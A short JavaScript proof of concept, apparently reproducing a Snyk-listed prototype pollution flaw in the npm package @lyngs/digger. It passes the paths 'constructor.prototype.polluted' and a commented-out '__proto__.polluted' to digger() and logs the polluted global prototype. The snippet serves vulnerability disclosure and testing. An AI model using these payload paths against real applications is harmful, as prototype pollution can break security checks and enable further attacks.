// //https://security.snyk.io/vuln/SNYK-JS-LYNGSDIGGER-1069826
// test("prototype pollution in @lyngs/digge", () => {
  const { digger } = require("@lyngs/digger");
console.log({}.polluted);
digger({}, "constructor.prototype.polluted", "yes", { extend: true });
  //digger({}, "__proto__.polluted", "yes", { extend: true });
console.log({}.polluted);
// });
